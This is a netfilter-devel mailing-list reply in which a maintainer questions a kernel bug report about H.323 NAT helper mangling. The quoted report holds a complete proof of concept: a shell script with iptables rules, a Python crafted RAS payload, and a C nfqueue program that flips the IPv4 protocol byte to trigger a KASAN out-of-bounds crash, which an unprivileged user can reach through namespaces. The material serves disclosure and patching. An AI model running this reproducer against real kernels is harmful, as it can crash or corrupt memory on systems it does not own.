Received: from mail.netfilter.org (mail.netfilter.org [217.70.190.124])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 47A483BBFB4
	for <netfilter-devel@vger.kernel.org>; Tue, 28 Jul 2026 19:40:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=217.70.190.124
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785267636; cv=none; b=thQy6g6OsNVq4INNNpCuEV7FQQXwWA/ix+gls9zHysLefMFyOixS0VsOm+evQu9SZUFAMiY+9f3rcX2cp+U/lDm68pL6/SpvFqxpBnyVQrhrbCexTgLARClO+NhhlYNB8R47fdZTqHJy8IA6B8td69DlUuaG0MZIybSAaTz4qgE=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785267636; c=relaxed/simple;
	bh=xn9vo20cdBGX2PhtY5Wnz/cJ9BoLfcIrM0pfLYBZDuE=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=XNZVxUb3Od73zc6D4B4CAkD2O4yvI/JQ655y9P+JdyJ0y4hWyDCeJ0aMN6TlZnHmDTCBt1pVzYHIOEQepNTWXOGuCQIrCbh4Ih+7CTT1l0x4DpUVVWFsp2kzWl6hVaFzQGIu9Ij5zomR9pPMpibJ9FUi/Jf78lyKyPZcpLy/4ps=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org; spf=pass smtp.mailfrom=netfilter.org; dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b=PqN6mtaY; arc=none smtp.client-ip=217.70.190.124
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=netfilter.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=netfilter.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=netfilter.org header.i=@netfilter.org header.b="PqN6mtaY"
Received: from netfilter.org (mail-agni [217.70.190.124])
	by mail.netfilter.org (Postfix) with UTF8SMTPSA id B4B4860190;
	Tue, 28 Jul 2026 21:40:29 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=netfilter.org;
	s=2025; t=1785267629;
	bh=gj0moR2EwzMu1Wz7CU7gDmDGInew+v8buKRRApwNxJ4=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=PqN6mtaYIoqeAYgAw/i0o9eNCdac7ZcosD9PvVt/3VKz30QlVxVnyMsTThG2OGKiU
	 BDwaxz2oD8YqnQ5XHHT+qjDynxlDY8eQ7jyE4NrPrNP33G7KGFCtAqoyAmrzUBWXQG
	 YDAqoLo/0dARmmc6aiplJe/nfyOkmkKat+RnT8Ov2FkdIh6iPVCq1m1PX7S6l28S5V
	 VbCB87xdDYs0QBg1RnwbhVn7+qldREsYL2bFOgUfdfEDlt4vtCfIAxqOsNsZ5BxvkD
	 IHq1MuoJJtAyHJyBBX9PFxPYkkjOo16XNp48sq6seyWZ+E2v/XNShzr4iBYWJKyvBJ
	 eB0kg/3O7quPw==
Date: Tue, 28 Jul 2026 21:40:27 +0200
From: Pablo Neira Ayuso <pablo@netfilter.org>
To: Ren Wei <enjou1224z@gmail.com>
Cc: netfilter-devel@vger.kernel.org, fw@strlen.de, phil@nwl.cc,
	davem@davemloft.net, edumazet@google.com, pabeni@redhat.com,
	horms@kernel.org, zhaojignmin@hotmail.com, kaber@trash.net,
	vega@nebusec.ai, zhilinz@nebusec.ai
Subject: Re: [PATCH nf 0/1] netfilter: h323: fix helper NAT mangling
Message-ID: <amkFqw-2vdtxEogs@chamomile>
References: <cover.1785133455.git.zhilinz@nebusec.ai>
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
In-Reply-To: <cover.1785133455.git.zhilinz@nebusec.ai>

Hi,

On Tue, Jul 28, 2026 at 01:58:22AM +0800, Ren Wei wrote:
> From: Zhiling Zou <zhilinz@nebusec.ai>
> 
> Hi Linux kernel maintainers,
> 
> We found and validated an issue in net/ipv4/netfilter/nf_nat_h323.c and
> net/netfilter/nf_conntrack_h323_main.c. The bug is reachable by a
> non-root user after creating user and net namespaces with namespace-local
> CAP_NET_ADMIN.
> 
> We've tested it, and it should not affect any other functionality.
> 
> We will provide detailed information about the bug
> in this email, along with a PoC to trigger it.
> 
> ---- details below ----
> 
> Bug details:
> 
> H.323 conntrack helpers parse packet payloads according to the helper
> that is attached to the conntrack entry. RAS parses UDP payloads, while
> Q.931 and H.245 parse TPKT data from TCP payloads.
> 
> The NAT helper later calls set_addr() to rewrite addresses embedded in
> those helper payloads. Before this fix, set_addr() chose
> nf_nat_mangle_tcp_packet() or nf_nat_mangle_udp_packet() from the
> packet's current IPv4 protocol byte. A namespace-local packet modifier
> can rewrite that byte after conntrack has accepted the original layout
> and before helper processing at the confirm hook.

You assume IPv4 protocol byte has been updated, and you provide an
example utility for nfqueue.

But we have already restricted this:

commit 54f34607d184c1cc056c59a5b3d86d96dd6a515c
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Jun 9 13:51:53 2026 +0200
 
    netfilter: nfnetlink_queue: restrict writes to network header

commit df07998dfd40796a05fff7ffea2661ad65ed42a7
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Jun 9 13:51:54 2026 +0200
 
    netfilter: nftables: restrict linklayer and network header writes

are you running a kernel with this patches?

> This makes the parser and NAT mangler use different transport-header
> bases. The PoC attaches the RAS helper to a UDP conntrack, queues the
> packet, changes the IPv4 protocol byte to TCP, and reinjects it.
> ras_help() still parses the address relative to the UDP payload, but
> set_addr() uses the TCP mangler and a forged TCP data offset. The NAT
> match offset then points past skb->tail and KASAN reports an
> out-of-bounds access in mangle_contents().
> 
> There is a second edge case on the H.245 helper path. The H.245 helper
> is registered with IPPROTO_UDP, but h245_help() parses TPKT/TCP data and
> uses the TCP doff as its base. Userspace can bind the registered H.245
> helper to a UDP conntrack with nftables. If NAT then selected the mangler
> only from the UDP tuple, the same parser/mangler base mismatch would
> remain reachable.
> 
> The fix selects the NAT mangler from nf_ct_protonum(ct), the stable
> protocol stored in the conntrack tuple, instead of the mutable IPv4
> protocol byte. It also ignores H.245 helper invocations on non-TCP
> conntracks before the TCP parser can feed offsets to NAT.
> 
> Reproducer:
> 
>     ./poc.sh
> 
> For user namespace reproduction:
> 
>     unshare -Urn sh -c '
>       cd /path/to/reproducer &&
>       ./poc.sh
>     '
> 
> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> 
> ------BEGIN poc.sh------
> 
> #!/bin/sh
> set -eu
> 
> DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
> IPT=${IPT:-/usr/sbin/iptables-legacy}
> IP=${IP:-/usr/sbin/ip}
> XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-${DIR}/xtables.lock}
> export XTABLES_LOCKFILE
> QUEUE_NUM=${QUEUE_NUM:-0}
> SRC_IP=${SRC_IP:-10.0.0.1}
> NAT_IP=${NAT_IP:-10.0.0.3}
> DST_IP=${DST_IP:-10.0.0.2}
> SRC_PORT=${SRC_PORT:-40000}
> DST_PORT=${DST_PORT:-1719}
> DEV=${DEV:-tun0}
> NFQ_PID=
> 
> cleanup() {
> 	if [ -n "${NFQ_PID}" ]; then
> 		kill "${NFQ_PID}" 2>/dev/null || true
> 		wait "${NFQ_PID}" 2>/dev/null || true
> 	fi
> 	${IPT} -t raw -D OUTPUT -p udp --dport "${DST_PORT}" -j CT --helper RAS 2>/dev/null || true
> 	${IPT} -t mangle -D OUTPUT -p udp --dport "${DST_PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}" 2>/dev/null || true
> 	${IPT} -t nat -D POSTROUTING -o "${DEV}" -j SNAT --to-source "${NAT_IP}" 2>/dev/null || true
> 	${IP} link del "${DEV}" 2>/dev/null || true
> }
> trap cleanup EXIT INT TERM
> 
> if [ "$(id -u)" != "0" ]; then
> 	echo "run as root or as uid 0 inside a user namespace" >&2
> 	exit 1
> fi
> 
> ${IP} link del "${DEV}" 2>/dev/null || true
> ${IP} tuntap add dev "${DEV}" mode tun user root
> ${IP} addr add "${SRC_IP}/24" dev "${DEV}"
> ${IP} addr add "${NAT_IP}/24" dev "${DEV}"
> ${IP} link set "${DEV}" up
> ${IP} route replace "${DST_IP}/32" dev "${DEV}"
> 
> ${IPT} -t raw -A OUTPUT -p udp --dport "${DST_PORT}" -j CT --helper RAS
> ${IPT} -t mangle -A OUTPUT -p udp --dport "${DST_PORT}" -j NFQUEUE --queue-num "${QUEUE_NUM}"
> ${IPT} -t nat -A POSTROUTING -o "${DEV}" -j SNAT --to-source "${NAT_IP}"
> 
> "${DIR}/nfq_mutate" "${QUEUE_NUM}" &
> NFQ_PID=$!
> sleep 1
> 
> python3 - <<'PY'
> from ipaddress import IPv4Address
> import os
> import socket
> 
> src_ip = os.environ.get("SRC_IP", "10.0.0.1")
> dst_ip = os.environ.get("DST_IP", "10.0.0.2")
> src_port = int(os.environ.get("SRC_PORT", "40000"))
> dst_port = int(os.environ.get("DST_PORT", "1719"))
> 
> class BW:
>     def __init__(self):
>         self.bits = []
> 
>     def bit(self, value):
>         self.bits.append(1 if value else 0)
> 
>     def bitsv(self, value, nbits):
>         for shift in range(nbits - 1, -1, -1):
>             self.bits.append((value >> shift) & 1)
> 
>     def align(self):
>         while len(self.bits) % 8:
>             self.bits.append(0)
> 
>     def bytes(self, data):
>         self.align()
>         for byte in data:
>             self.bitsv(byte, 8)
> 
>     def out(self):
>         self.align()
>         out = bytearray()
>         for i in range(0, len(self.bits), 8):
>             value = 0
>             for bit in self.bits[i:i + 8]:
>                 value = (value << 1) | bit
>             out.append(value)
>         return bytes(out)
> 
> bw = BW()
> 
> # RasMessage ::= locationRequest
> bw.bit(0)
> bw.bitsv(18, 5)
> 
> # LocationRequest root: endpointIdentifier present, nonStandardData absent.
> bw.bit(0)
> bw.bitsv(0b10, 2)
> bw.align()
> 
> # requestSeqNum
> bw.bytes((1).to_bytes(2, "big"))
> 
> # endpointIdentifier: 121 UTF-16 code units. Byte 4 becomes 0xf0, which the
> # later TCP interpretation uses as a fake data offset.
> bw.bitsv(120, 7)
> bw.align()
> bw.bytes(b"A\x00" * 121)
> 
> # destinationInfo: empty
> bw.align()
> bw.bytes(b"\x00")
> 
> # replyAddress ::= ipAddress { ip, port }
> bw.bit(0)
> bw.bitsv(0, 3)
> bw.align()
> bw.bytes(IPv4Address(src_ip).packed)
> bw.align()
> bw.bytes(src_port.to_bytes(2, "big"))
> 
> payload = bw.out()
> print(f"payload_len={len(payload)} payload4={payload[4]:#x}")
> 
> s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
> s.bind((src_ip, src_port))
> s.sendto(payload, (dst_ip, dst_port))
> PY
> 
> wait "${NFQ_PID}"
> 
> ------END poc.sh--------
> 
> ------BEGIN nfq_mutate.c------
> 
> #define _GNU_SOURCE
> #include <arpa/inet.h>
> #include <errno.h>
> #include <libmnl/libmnl.h>
> #include <linux/netfilter.h>
> #include <linux/netfilter/nfnetlink.h>
> #include <linux/netfilter/nfnetlink_queue.h>
> #include <netinet/ip.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> 
> struct queued_pkt {
> 	uint32_t id;
> 	uint8_t *payload;
> 	uint32_t payload_len;
> 	bool ready;
> };
> 
> static uint16_t ip_checksum(void *buf, size_t len)
> {
> 	uint32_t sum = 0;
> 	uint16_t *p = buf;
> 
> 	while (len > 1) {
> 		sum += *p++;
> 		len -= 2;
> 	}
> 	if (len)
> 		sum += *(uint8_t *)p;
> 	while (sum >> 16)
> 		sum = (sum & 0xffff) + (sum >> 16);
> 	return ~sum;
> }
> 
> static int parse_attr_cb(const struct nlattr *attr, void *data)
> {
> 	const struct nlattr **tb = data;
> 	int type = mnl_attr_get_type(attr);
> 
> 	if (mnl_attr_type_valid(attr, NFQA_MAX) < 0)
> 		return MNL_CB_OK;
> 
> 	switch (type) {
> 	case NFQA_PACKET_HDR:
> 		if (mnl_attr_validate2(attr, MNL_TYPE_UNSPEC,
> 				       sizeof(struct nfqnl_msg_packet_hdr)) < 0)
> 			return MNL_CB_ERROR;
> 		break;
> 	case NFQA_PAYLOAD:
> 		break;
> 	default:
> 		break;
> 	}
> 
> 	tb[type] = attr;
> 	return MNL_CB_OK;
> }
> 
> static int queue_cb(const struct nlmsghdr *nlh, void *data)
> {
> 	const struct nlattr *tb[NFQA_MAX + 1] = {};
> 	const struct nfqnl_msg_packet_hdr *ph;
> 	struct queued_pkt *pkt = data;
> 
> 	mnl_attr_parse(nlh, sizeof(struct nfgenmsg), parse_attr_cb, (void *)tb);
> 	if (!tb[NFQA_PACKET_HDR] || !tb[NFQA_PAYLOAD])
> 		return MNL_CB_ERROR;
> 
> 	ph = mnl_attr_get_payload(tb[NFQA_PACKET_HDR]);
> 	pkt->id = ntohl(ph->packet_id);
> 	pkt->payload_len = mnl_attr_get_payload_len(tb[NFQA_PAYLOAD]);
> 	pkt->payload = malloc(pkt->payload_len);
> 	if (!pkt->payload) {
> 		perror("malloc");
> 		exit(1);
> 	}
> 	memcpy(pkt->payload, mnl_attr_get_payload(tb[NFQA_PAYLOAD]),
> 	       pkt->payload_len);
> 	pkt->ready = true;
> 	return MNL_CB_STOP;
> }
> 
> static struct nlmsghdr *build_cfg_pf_request(char *buf, uint8_t command)
> {
> 	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
> 	struct nfgenmsg *nfg;
> 	struct nfqnl_msg_config_cmd cmd = {
> 		.command = command,
> 		.pf = htons(AF_INET),
> 	};
> 
> 	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
> 	nlh->nlmsg_flags = NLM_F_REQUEST;
> 	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> 	nfg->nfgen_family = AF_UNSPEC;
> 	nfg->version = NFNETLINK_V0;
> 	mnl_attr_put(nlh, NFQA_CFG_CMD, sizeof(cmd), &cmd);
> 	return nlh;
> }
> 
> static struct nlmsghdr *build_cfg_request(char *buf, uint8_t command,
> 					  uint16_t queue_num)
> {
> 	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
> 	struct nfgenmsg *nfg;
> 	struct nfqnl_msg_config_cmd cmd = {
> 		.command = command,
> 		.pf = htons(AF_INET),
> 	};
> 
> 	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
> 	nlh->nlmsg_flags = NLM_F_REQUEST;
> 	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> 	nfg->nfgen_family = AF_UNSPEC;
> 	nfg->version = NFNETLINK_V0;
> 	nfg->res_id = htons(queue_num);
> 	mnl_attr_put(nlh, NFQA_CFG_CMD, sizeof(cmd), &cmd);
> 	return nlh;
> }
> 
> static struct nlmsghdr *build_cfg_params(char *buf, uint8_t mode, int range,
> 					 uint16_t queue_num)
> {
> 	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
> 	struct nfgenmsg *nfg;
> 	struct nfqnl_msg_config_params params = {
> 		.copy_range = htonl(range),
> 		.copy_mode = mode,
> 	};
> 
> 	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG;
> 	nlh->nlmsg_flags = NLM_F_REQUEST;
> 	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> 	nfg->nfgen_family = AF_UNSPEC;
> 	nfg->version = NFNETLINK_V0;
> 	nfg->res_id = htons(queue_num);
> 	mnl_attr_put(nlh, NFQA_CFG_PARAMS, sizeof(params), &params);
> 	return nlh;
> }
> 
> static struct nlmsghdr *build_verdict(char *buf, const struct queued_pkt *pkt,
> 				      uint16_t queue_num, uint32_t verdict)
> {
> 	struct nlmsghdr *nlh = mnl_nlmsg_put_header(buf);
> 	struct nfgenmsg *nfg;
> 	struct nfqnl_msg_verdict_hdr vh = {
> 		.verdict = htonl(verdict),
> 		.id = htonl(pkt->id),
> 	};
> 
> 	nlh->nlmsg_type = (NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_VERDICT;
> 	nlh->nlmsg_flags = NLM_F_REQUEST;
> 	nfg = mnl_nlmsg_put_extra_header(nlh, sizeof(*nfg));
> 	nfg->nfgen_family = AF_UNSPEC;
> 	nfg->version = NFNETLINK_V0;
> 	nfg->res_id = htons(queue_num);
> 	mnl_attr_put(nlh, NFQA_VERDICT_HDR, sizeof(vh), &vh);
> 	mnl_attr_put(nlh, NFQA_PAYLOAD, pkt->payload_len, pkt->payload);
> 	return nlh;
> }
> 
> static void mutate_packet(struct queued_pkt *pkt)
> {
> 	struct iphdr *iph;
> 	uint8_t *l4;
> 
> 	if (pkt->payload_len < sizeof(*iph))
> 		return;
> 
> 	iph = (struct iphdr *)pkt->payload;
> 	if (iph->version != 4 || iph->ihl < 5)
> 		return;
> 	if (pkt->payload_len < iph->ihl * 4U + 13)
> 		return;
> 
> 	l4 = pkt->payload + iph->ihl * 4U;
> 	fprintf(stderr,
> 		"nfqueue: id=%u len=%u old_proto=%u doff_byte_before=%#x\n",
> 		pkt->id, pkt->payload_len, iph->protocol, l4[12]);
> 
> 	iph->protocol = IPPROTO_TCP;
> 	iph->check = 0;
> 	iph->check = ip_checksum(iph, iph->ihl * 4U);
> 
> 	fprintf(stderr,
> 		"nfqueue: id=%u new_proto=%u doff_byte_after=%#x\n",
> 		pkt->id, iph->protocol, l4[12]);
> }
> 
> int main(int argc, char **argv)
> {
> 	struct mnl_socket *nl;
> 	char buf[MNL_SOCKET_BUFFER_SIZE];
> 	struct nlmsghdr *nlh;
> 	struct queued_pkt pkt = {};
> 	unsigned int portid;
> 	uint16_t queue_num = 0;
> 	int ret;
> 
> 	if (argc > 1)
> 		queue_num = (uint16_t)atoi(argv[1]);
> 
> 	nl = mnl_socket_open(NETLINK_NETFILTER);
> 	if (!nl) {
> 		perror("mnl_socket_open");
> 		return 1;
> 	}
> 
> 	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
> 		perror("mnl_socket_bind");
> 		return 1;
> 	}
> 	portid = mnl_socket_get_portid(nl);
> 
> 	nlh = build_cfg_pf_request(buf, NFQNL_CFG_CMD_PF_UNBIND);
> 	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
> 		perror("PF_UNBIND");
> 
> 	nlh = build_cfg_pf_request(buf, NFQNL_CFG_CMD_PF_BIND);
> 	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> 		perror("PF_BIND");
> 		return 1;
> 	}
> 
> 	nlh = build_cfg_request(buf, NFQNL_CFG_CMD_BIND, queue_num);
> 	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> 		perror("QUEUE_BIND");
> 		return 1;
> 	}
> 
> 	nlh = build_cfg_params(buf, NFQNL_COPY_PACKET, 0xffff, queue_num);
> 	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> 		perror("CFG_PARAMS");
> 		return 1;
> 	}
> 
> 	for (;;) {
> 		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
> 		if (ret < 0) {
> 			perror("mnl_socket_recvfrom");
> 			return 1;
> 		}
> 		ret = mnl_cb_run(buf, ret, 0, portid, queue_cb, &pkt);
> 		if (ret < 0) {
> 			perror("mnl_cb_run");
> 			return 1;
> 		}
> 		if (!pkt.ready)
> 			continue;
> 
> 		mutate_packet(&pkt);
> 		nlh = build_verdict(buf, &pkt, queue_num, NF_ACCEPT);
> 		if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) {
> 			perror("send verdict");
> 			return 1;
> 		}
> 		free(pkt.payload);
> 		break;
> 	}
> 
> 	mnl_socket_close(nl);
> 	return 0;
> }
> 
> ------END nfq_mutate.c--------
> 
> ----BEGIN crash log----
> 
> [  142.557736] [   T1073] BUG: KASAN: out-of-bounds in mangle_contents (../net/netfilter/nf_nat_helper.c:38:2)
> [  142.557790] [   T1073] Read of size 18446744073709551564 at addr ffff88810fc8ee9f by task nfq_mutate/1073
> 
> [  142.557839] [   T1073] CPU: 1 UID: 1028 PID: 1073 Comm: nfq_mutate Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
> [  142.557860] [   T1073] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [  142.557871] [   T1073] Call Trace:
> [  142.557885] [   T1073]  <TASK>
> [  142.557895] [   T1073]  dump_stack_lvl (../lib/dump_stack.c:118:3)
> [  142.557963] [   T1073]  print_report (../include/linux/mm.h:1903:22 ../mm/kasan/report.c:289:10 ../mm/kasan/report.c:376:22 ../mm/kasan/report.c:482:3)
> [  142.558014] [   T1073]  ? mangle_contents (../net/netfilter/nf_nat_helper.c:38:2)
> [  142.558102] [   T1073]  kasan_report (../mm/kasan/report.c:593:2)
> [  142.558133] [   T1073]  kasan_check_range (../mm/kasan/generic.c:183:10 ../mm/kasan/generic.c:200:9)
> [  142.558145] [   T1073]  __asan_memmove (../mm/kasan/shadow.c:94:7)
> [  142.558163] [   T1073]  mangle_contents (../net/netfilter/nf_nat_helper.c:38:2)
> [  142.558192] [   T1073]  __nf_nat_mangle_tcp_packet (../net/netfilter/nf_nat_helper.c:106:20)
> [  142.558209] [   T1073]  set_addr (../net/ipv4/netfilter/nf_nat_h323.c:26:1)
> [  142.558316] [   T1073]  set_ras_addr (../net/ipv4/netfilter/nf_nat_h323.c:166:18)
> [  142.558379] [   T1073]  ras_help (../net/netfilter/nf_conntrack_h323_main.c:1675:2)
> [  142.558565] [   T1073]  nf_confirm (../include/linux/skbuff.h:3130:24 ../include/linux/ipv6.h:110:27 ../net/netfilter/nf_conntrack_proto.c:160:10)
> [  142.558728] [   T1073]  nfqnl_reinject (../include/linux/bitops.h:126:32 ../include/linux/jhash.h:139:3 ../include/linux/rhashtable.h:143:11 ../include/linux/rhashtable.h:153:22 ../include/linux/rhashtable.h:168:9 ../include/linux/rhashtable.h:1058:9 ../include/linux/rhashtable.h:1144:16 ../include/linux/rhashtable.h:1173:9 ../net/netfilter/nfnetlink_queue.c:236:2)
> [  142.558746] [   T1073]  nfqnl_recv_verdict (../net/netfilter/nfnetlink_queue.c:1539:6)
> [  142.559195] [   T1073]  netlink_unicast (../include/net/net_namespace.h:419:9 ../include/net/sock.h:713:9 ../net/netlink/af_netlink.c:1260:2 ../net/netlink/af_netlink.c:1269:12 ../net/netlink/af_netlink.c:1359:9)
> [  142.559272] [   T1073]  netlink_sendmsg (../net/netlink/af_netlink.c:1875:24)
> [  142.559350] [   T1073]  __sys_sendto (../net/socket.c:790:2 ../net/socket.c:802:16 ../net/socket.c:2265:9)
> [  142.559478] [   T1073]  __x64_sys_sendto (../net/socket.c:2272:9 ../net/socket.c:2268:1 ../net/socket.c:2268:1)
> [  142.559530] [   T1073]  do_syscall_64 (../arch/x86/include/asm/entry-common.h:43:3 ../include/linux/irq-entry-common.h:100:2 ../include/linux/entry-common.h:174:2 ../arch/x86/entry/syscall_64.c:89:7)
> [  142.559542] [   T1073]  entry_SYSCALL_64_after_hwframe (../arch/x86/entry/entry_64.S:121)
> [  142.559645] [   T1073]  </TASK>
> 
> [  142.559796] [   T1073] Allocated by task 1076 on cpu 3 at 142.556120s:
> [  142.559809] [   T1073]  kasan_save_stack (../mm/kasan/common.c:57:15)
> [  142.559833] [   T1073]  __kasan_slab_alloc (../mm/kasan/common.c:352:5)
> [  142.559844] [   T1073]  kmem_cache_alloc_node_noprof (../mm/slub.c:4756:5 ../mm/slub.c:4883:11 ../mm/slub.c:4950:14)
> [  142.559876] [   T1073]  kmalloc_reserve (../net/core/skbuff.c:613:9)
> [  142.559892] [   T1073]  __alloc_skb (../net/core/skbuff.c:703:6)
> [  142.559905] [   T1073]  alloc_skb_with_frags (../net/core/skbuff.c:6730:6)
> [  142.559925] [   T1073]  sock_alloc_send_pskb (../include/net/sock.h:2117:10 ../net/core/sock.c:2959:14 ../net/core/sock.c:2996:11)
> [  142.559942] [   T1073]  __ip_append_data (../include/linux/refcount.h:291:3 ../include/linux/refcount.h:312:2 ../net/ipv4/ip_output.c:1277:3)
> [  142.559953] [   T1073]  ip_make_skb (../net/ipv4/ip_output.c:1583:1)
> [  142.559964] [   T1073]  udp_sendmsg (../include/linux/rcupdate.h:867:2 ../include/net/l3mdev.h:102:3 ../net/ipv4/udp.c:1387:18)
> 
> [  142.560041] [   T1073] The buggy address belongs to the object at ffff88810fc8ed40
> which belongs to the cache skbuff_small_head of size 704
> [  142.560059] [   T1073] The buggy address is located 351 bytes inside of
> 704-byte region [ffff88810fc8ed40, ffff88810fc8f000)
> 
> [  142.560245] [   T1073] Memory state around the buggy address:
> [  142.560254] [   T1073]  ffff88810fc8ed80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
> [  142.560264] [   T1073]  ffff88810fc8ee00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
> [  142.560276] [   T1073] >ffff88810fc8ee80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
> [  142.560287] [   T1073]                             ^
> [  142.560317] [   T1073]  ffff88810fc8ef00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
> [  142.560327] [   T1073]  ffff88810fc8ef80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
> [  142.560335] [   T1073] ==================================================================
> [  142.560397] [   T1073] Disabling lock debugging due to kernel taint
> 
> -----END crash log-----
> 
> Best regards,
> Zhiling Zou
> 
> Zhiling Zou (1):
>   netfilter: h323: keep NAT mangling aligned with parsed transport
> 
>  net/ipv4/netfilter/nf_nat_h323.c       | 9 +++++++--
>  net/netfilter/nf_conntrack_h323_main.c | 4 ++++
>  2 files changed, 11 insertions(+), 2 deletions(-)
> 
> -- 
> 2.43.0
